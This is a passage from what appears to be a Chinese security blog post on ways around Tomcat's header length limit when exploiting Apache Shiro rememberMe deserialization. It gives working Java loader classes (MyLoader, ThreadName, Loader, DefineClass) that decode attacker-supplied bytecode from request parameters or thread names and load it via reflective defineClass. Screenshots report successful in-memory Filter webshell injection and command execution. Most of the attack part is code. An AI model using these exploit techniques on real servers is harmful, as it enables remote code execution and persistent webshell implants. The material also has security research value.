href="http://wjlshare.com/archives/1545%E4%B8%AD%E7%BC%96%E5%86%99%E7%9A%84%E7%B1%BB%E3%80%82">http://wjlshare.com/archives/1545中编写的类。</a></p><p>3.生成rememberMe并发包</p><p>将上面的类：<code>生成字节码-&gt;使用TemplatesImpl加载-&gt;利用CBShiro链装配TemplatesImpl-&gt;序列化-&gt;AES加密-&gt;Base64编码-&gt;修改maxHttpHeaderSize的rememberMe</code></p><p>将修改maxHttpHeaderSize的rememberMe在Cookie rememberMe中多线程同时发送(这里可以使用Burp的Intruder模块进行多线程发包)；</p><p>在发包的同时，使用Repeater模块重放原先超过长度限制的<code>注入内存马/回显执行命令</code>等请求的Payload生成的rememberMe。</p><p><strong>修改maxHttpHeaderSize失败的原因分析</strong></p><p>在上面的测试中，发现并不能成功修改maxHttpHeaderSize，经过分析和测试，最终发现：</p><p>上面修改maxHttpHeaderSize的类，不适用于Tomcat8.5.78等版本(其他版本暂未测试)。</p><p>我们知道：</p><blockquote><p>Tomcat处理请求的线程中，存在ContextClassLoader对象，而该对象保存了StandardContext对象</p></blockquote><p>但在Tomcat8.5.78环境下，无法从ContextClassLoader中获取到StandardContext，所以最终导致了修改maxHttpHeaderSize失败。这也是之前研究Shiro反序列化漏洞利用时，maxHttpHeaderSize修改失败的原因。可以尝试其他获取StandardContext的方式，这里不再尝试，直接使用Tomcat 9.0.19进行测试。</p><p><strong>更改环境为适用的环境(这里是Tomcat 9.0.19)，重新测试</strong></p><p>1.将修改maxHttpHeaderSize的rememberMe在Cookie rememberMe中多线程同时发送</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671760352619-423d3970-be5e-4346-b3bf-5f105ef070e6.png" alt="image.png"></p><p>2.使用Repeater模块重放原先超过长度限制的<code>注入内存马/回显执行命令</code>等请求的Payload生成的rememberMe(这里以注入Filter内存马为例，由于比较常见不再贴出代码，生成rememberMe的过程和上面生成<code>修改maxHttpHeaderSize的rememberMe</code>步骤相同)：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671760470358-68d7ac08-c0ef-4380-b12f-ef82dcd4d7dc.png" alt="image.png"></p><p>响应不为400，说明绕过成功了。</p><p>3.测试注入的内存马：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671760610983-65526ff4-c002-445d-8401-5234171b6ba3.png" alt="image.png"></p><p>发现能成功执行命令。</p><p>至此，完成了通过<code>修改maxHttpHeaderSize</code>绕过Tomcat Header长度限制的分析和利用。</p><h3 id="2-2-减少HTTP-Header的size"><a href="#2-2-减少HTTP-Header的size" class="headerlink" title="2.2. 减少HTTP Header的size"></a>2.2. 减少HTTP Header的size</h3><h4 id="2-2-1-分离Payload-动态加载类字节码"><a href="#2-2-1-分离Payload-动态加载类字节码" class="headerlink" title="2.2.1. 分离Payload+动态加载类字节码"></a>2.2.1. 分离Payload+动态加载类字节码</h4><p>上面修改maxHttpHeaderSize绕过Tomcat Header长度限制的方法，会受Tomcat环境影响。</p><p>有没有不受Tomcat环境影响的方法？于是，就有师傅采取了<code>分离payload+动态类加载</code>的方法绕过Tomcat Header长度限制。</p><p>之前研究Shiro反序列化漏洞利用时，直接利用这种方法依旧失败了。那么，接下来对这种方法进行分析，分析后再尝试利用。</p><p><strong>Payload的分离</strong></p><p>Shiro反序列化利用的Payload是通过<code>恶意类(如：注入内存马/回显执行命令等)的类字节码-&gt;使用TemplatesImpl加载-&gt;装配到Gadget chain-&gt;序列化-&gt;AES加密-&gt;Base64编码</code>生成的。</p><p>因此，当Payload超过Tomcat Header长度限制时，考虑将<code>恶意类的类字节码</code>和<code>Gadget chain-&gt;序列化-&gt;AES加密-&gt;Base64编码</code>进行分离，从而减少HTTP Header的size。</p><p><strong>类字节码的动态加载</strong></p><p>上面分离之后，就要考虑一个问题就是：如何将<code>恶意类的类字节码</code>和<code>Gadget chain-&gt;序列化-&gt;AES加密-&gt;Base64编码</code>分别发送到目标站点，接着再加载<code>恶意类的类字节码</code>？</p><p>于是想到了利用ClassLoader去加载我们在HTTP请求体中向目标站点发送的恶意类的类字节码。</p><p>ClassLoader类的defineClass方法，会将加载的类字节码在JVM中注册为一个Class对象。</p><p>调用ClassLoader类的defineClass方法一般有两种方式：</p><ol><li>自定义ClassLoader</li><li>反射调用defineClass</li></ol><p><strong>生成rememberMe</strong></p><p>所以，我们可以将调用<code>ClassLoader#defineClass</code>方法加载HTTP请求体中类字节码的类，生成类字节码，使用TemplatesImpl加载并装配到Gadget chain，最终生成rememberMe的值：</p><blockquote><p>需要注意的是：因为同一个ClassLoader不能重复加载同一个类，所以每次请求都要生成一个新的ClassLoader。</p></blockquote><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyLoader</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"><span class="comment">//    //自定义ClassLoader</span></span><br><span class="line"><span class="comment">//    public static class DefineLoader extends ClassLoader &#123;</span></span><br><span class="line"><span class="comment">//        public Class load(byte[] bytes) &#123;</span></span><br><span class="line"><span class="comment">//            return super.defineClass(null, bytes, 0, bytes.length);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLoader</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">jioEndPoint</span> <span class="operator">=</span> GetAcceptorThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getField(getField(jioEndPoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">processors</span> <span class="operator">=</span> (ArrayList) getField(object, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> processors.iterator();</span><br><span class="line">            <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">next</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> getField(next, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">serverPort</span> <span class="operator">=</span> getField(req, <span class="string">&quot;serverPort&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (serverPort.equals(-<span class="number">1</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将org.apache.coyote.Request转换为org.apache.catalina.connector.Request</span></span><br><span class="line">                org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) ((org.apache.coyote.Request) req).getNote(<span class="number">1</span>);</span><br><span class="line">                org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                <span class="comment">//获取请求中的classData参数的值</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">bs64_data</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;classData&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(bs64_data != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="comment">//将请求中的classData参数的值进行Base64解码得到类字节码</span></span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(bs64_data);</span><br><span class="line"><span class="comment">//                    /**</span></span><br><span class="line"><span class="comment">//                     * 1.自定义ClassLoader调用ClassLoader类的defineClass方法</span></span><br><span class="line"><span class="comment">//                     * */</span></span><br><span class="line"><span class="comment">//                    Class clazz = new MyLoader.DefineLoader().load(bytes);</span></span><br><span class="line"><span class="comment">//                    clazz.newInstance().equals(new Object[]&#123;request,response&#125;);</span></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                     * 2.反射调用ClassLoader类的defineClass方法</span></span><br><span class="line"><span class="comment">                     * */</span></span><br><span class="line">                    <span class="comment">//反射获取ClassLoader类的defineClass方法</span></span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">                    defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="comment">//反射调用defineClass方法加载classData参数中的类字节码</span></span><br><span class="line">                    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(MyLoader.class.getClassLoader(), bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">                    clazz.newInstance();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> &#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取Acceptor线程</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">GetAcceptorThread</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//获取当前所有线程</span></span><br><span class="line">        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="literal">null</span> || thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">jioEndPoint</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123; <span class="comment">//Tomcat678</span></span><br><span class="line">                    jioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (jioEndPoint == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;<span class="comment">//Tomcat9</span></span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> jioEndPoint;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>生成Payload</strong></p><p>这里同样以超过长度限制的注入Filter内存马为例，由于比较常见不再贴出代码。</p><p>将构造的恶意类的类字节码进行Base64编码，生成Payload。</p><p><strong>触发Payload</strong></p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1676533109415-6c77ca91-22a0-4c19-882c-635afece48b1.png" alt="image.png"></p><p>当rememberMe值和Payload一起发包后，rememberMe值<code>Base64解码-&gt;AES解密-&gt;反序列化-&gt;Gadget chain</code>，Gadget chain会加载MyLoader类，在MyLoader类里会将HTTP请求体中发送的Payload进行Base64解码得到恶意类的类字节码，通过<code>ClassLoader#defineClass</code>方法加载触发。</p><p>经过测试，成功触发，注入内存马成功：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1676533172658-9ec4773d-ed77-4beb-a687-534dbe2660b9.png" alt="image.png"></p><p>这里有个疑问：为什么通过defineClass方法加载恶意类的类字节码后，就能进行触发？</p><p>原因：</p><ul><li><p>在Class对象的newInstance()方法创建类实例时，会调用静态初始块和构造函数。</p></li><li><p>也可以采用重写equals、toString等方法，创建类实例后调用重写的equals、toString等方法。</p><blockquote><p>如果要传递request和response，可以通过重写equals方法</p></blockquote></li></ul><p>至此，完成了通过<code>分离Payload+动态加载类字节码</code>绕过Tomcat Header长度限制的分析和利用。</p><h4 id="2-2-2-缩短Payload-分散发包"><a href="#2-2-2-缩短Payload-分散发包" class="headerlink" title="2.2.2. 缩短Payload+分散发包"></a>2.2.2. 缩短Payload+分散发包</h4><p>Y4tacker师傅根据<code>分离Payload+动态加载类字节码</code>的思路，提出了一个新的思路：缩短payload+分散发包</p><p>Y4tacker师傅的思考简述：</p><blockquote><p>在全局寻找能够持久存储Payload的地方，想到通过修改当前线程对象的名字(<code>Thread.currentThread().setName()</code>)来存储Payload。(师傅的文中，已测试Thread name具有足够的长度存储能力)</p></blockquote><p>于是根据其思路，这里分析并进行实现一下：</p><p><strong>筛选线程</strong></p><p>由于：</p><blockquote><p>每一次HTTP请求到达Web服务，Tomcat都会创建一个线程来处理该请求。</p></blockquote><p>所以，将当前Thread name先修改为具有标识性的字符串，通过该标识可以更方便的筛选出存储Payload的Thread name：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置Thead name为Qwzf</span></span><br><span class="line">Thread.currentThread().setName(<span class="string">&quot;Qwzf&quot;</span>);</span><br></pre></td></tr></table></figure></div><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1676519489001-c7e3aa52-efca-453d-a3ed-84ae23209c33.png" alt="image.png"></p><p><strong>生成并缩短Payload</strong></p><p>生成在Thread name上设置的原先超过长度限制的<code>注入内存马/回显执行命令</code>等请求的Payload(这里也同样以超过长度限制的注入Filter内存马为例，由于比较常见不再贴出代码)。</p><p>缩短Payload可参考<a href="https://xz.aliyun.com/t/6227%E8%BF%9B%E8%A1%8C%E7%BC%A9%E7%9F%AD%EF%BC%8C%E4%B8%8D%E5%86%8D%E8%B4%B4%E5%87%BA%E4%BB%A3%E7%A0%81%E3%80%82">https://xz.aliyun.com/t/6227进行缩短，不再贴出代码。</a></p><p><strong>分散发包</strong></p><p>将Payload分成多段加入到Thread name。即，每次将Payload的一部分追加到Thread name，生成rememberMe，在Cookie中发送。</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadName</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ThreadName</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//Thread.currentThread().setName(&quot;Qwzf&quot;);</span></span><br><span class="line">        <span class="type">ThreadGroup</span> <span class="variable">a</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">v2</span> <span class="operator">=</span> a.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        v2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Thread[] o = (Thread[]) v2.get(a);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; o.length; ++i) &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">z</span> <span class="operator">=</span> o[i];</span><br><span class="line">            <span class="comment">//在具有Qwzf标识的Thread name后添加Payload</span></span><br><span class="line">            <span class="keyword">if</span> (z.getName().contains(<span class="string">&quot;Qwzf&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">//将Payload分成多段加入，Payload1、Payload2......</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">Payload1</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="comment">//String Payload2 = &quot;&quot;;</span></span><br><span class="line">                <span class="comment">//String Payload3 = &quot;&quot;;</span></span><br><span class="line">                <span class="comment">//String Payload4 = &quot;&quot;;</span></span><br><span class="line"></span><br><span class="line">                z.setName(z.getName()+Payload1);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1676519614596-b74e16c0-a154-468b-9cc8-13a7d431a64c.png" alt="image.png"></p><p><strong>触发Payload</strong></p><p>将在Thread name上设置的注入内存马的Payload进行Base64解码得到恶意类的类字节码，通过defineClass方法进行加载触发。</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Loader</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Loader</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ThreadGroup</span> <span class="variable">a</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">v2</span> <span class="operator">=</span> a.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        v2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Thread[] o = (Thread[]) v2.get(a);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; o.length; ++i) &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">z</span> <span class="operator">=</span> o[i];</span><br><span class="line">            <span class="comment">//使用ClassLoader类的defineClass方法加载具有Qwzf标识的Thread name中的Payload</span></span><br><span class="line">            <span class="keyword">if</span> (z.getName().contains(<span class="string">&quot;Qwzf&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes2 = <span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(z.getName().replaceAll(<span class="string">&quot;Qwzf&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                <span class="comment">//反射获取ClassLoader类的defineClass方法</span></span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">                defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">//反射调用defineClass方法加载Thread name中的注入内存马的类字节码</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(Loader.class.getClassLoader(), bytes2, <span class="number">0</span>, bytes2.length);</span><br><span class="line">                clazz.newInstance();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>将触发代码，生成rememberMe，在Cookie中发送，最终注入成功，效果如下：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1676617257007-16d78011-b664-4d49-86af-b9c5154508e0.png" alt="image.png"></p><p>至此，完成了通过<code>缩短Payload+分散发包</code>绕过Tomcat Header长度限制的分析和利用。</p><h4 id="2-2-3-Gzip-Base64压缩编码类字节码"><a href="#2-2-3-Gzip-Base64压缩编码类字节码" class="headerlink" title="2.2.3. Gzip+Base64压缩编码类字节码"></a>2.2.3. Gzip+Base64压缩编码类字节码</h4><p>(这里也同样以超过长度限制的注入Filter内存马为例)</p><p><strong>Gzip</strong></p><blockquote><p>DEFLATE是同时使用了LZ77算法与哈夫曼编码(Huffman Coding)的一个无损数据压缩算法，DEFLATE 压缩与解压的源代码可以在自由、通用的压缩库zlib上找到，JDK中对zlib压缩库提供了支持，对压缩类Deflater和解压类Inflater，都提供了 native 方法。</p><p>Gzip是GNUzip的缩写，最早用于UNIX系统的文件压缩。Gzip的实现算法是DEFLATE，只不过在DEFLATE格式上增加了文件头和文件尾。JDK对Gzip提供了支持，分别是GZIPOutputStream和GZIPInputStream类，GZIPOutputStream继承于DeflaterOutputStream，GZIPInputStream继承于InflaterInputStream。</p></blockquote><p><strong>classes字段</strong></p><p>由于在Class.forName的实现过程中，会查找ClassLoader的classes字段。所以可以：</p><ul><li><p>在第一次请求时，先调用defineClass将恶意的Filter类注册到JVM，并添加到ClassLoader的classes字段中；</p></li><li><p>在第二次请求时，Class.forName直接获取这个恶意的Filter类，从而减少单次Payload长度。</p></li></ul><p><strong>添加恶意filter到classes字段</strong></p><p>将恶意的Filter类进行gzip压缩+Base64编码放到DefineClass类中，在DefineClass类中先进行解码解压缩，再反射获取classes字段，将恶意Filter类的类字节码注册到JVM并存储到ClassLoader类的classes字段中。</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">BASE64Decoder</span> <span class="variable">b64Decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder();</span><br><span class="line">        <span class="comment">//ShellFilter类字节码的gzip压缩+Base64编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classData</span> <span class="operator">=</span> <span 